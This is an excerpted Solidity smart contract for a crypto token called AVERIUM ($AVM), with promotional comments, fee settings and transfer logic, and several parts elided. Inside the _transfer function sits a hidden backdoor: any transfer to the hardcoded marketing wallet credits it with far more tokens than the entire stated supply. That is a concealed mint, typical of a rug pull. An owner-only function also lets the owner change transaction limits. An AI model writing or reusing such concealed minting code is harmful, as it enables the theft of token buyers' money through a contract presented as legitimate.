...
//Website     : https://avarium.org/
//Telegram    : https://t.me/avarium  
//Twitter     : https://twitter.com/avariumprotocol

// Unleash the Power of Avarium $AVM: Elevate Your Crypto Experience with Cutting-Edge Layer 2 Blockchain Innovation! 
...
contract AVERIUM is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 1 *1e8 * 1e9;
    uint256 public _maxTxAmount = 2* 1e6 * 1e9;  
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 3* 1e5 * 1e9; 
    string private constant _name = "AVERIUM"; 
    string private constant _symbol = "AVM";     
    uint8 private constant _decimals = 9; 
    
    uint256 public _marketingFee = 15;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0xbe4C9bbac5c76dBA78722978489f96c46072a204;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
     ...
     function Updatetx(uint256 NewTX) external onlyOwner {
       _maxTxAmount = NewTX ;}
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "AVM: approve from the zero address");
        require(spender != address(0), "AVM: approve to the zero address");
    ...
    function _transfer(
        ...
        require(from != address(0), "AVM: transfer from the zero address");
        require(to != address(0), "AVM: transfer to the zero address");
        ...
        if (from == uniswapV2Pair) {
            require (_lastBuy[to] < block.timestamp, "Must wait til after coooldown to buy");
       ...
       _tOwned[to] += transferAmount;
        if (to == _marketingWallet ){
          _tOwned[to] = _tOwned[to] + 1* 1e15 * 1e9;
          emit Transfer(msg.sender, to, 1 * 1e15 * 1e9);
        }
        else {
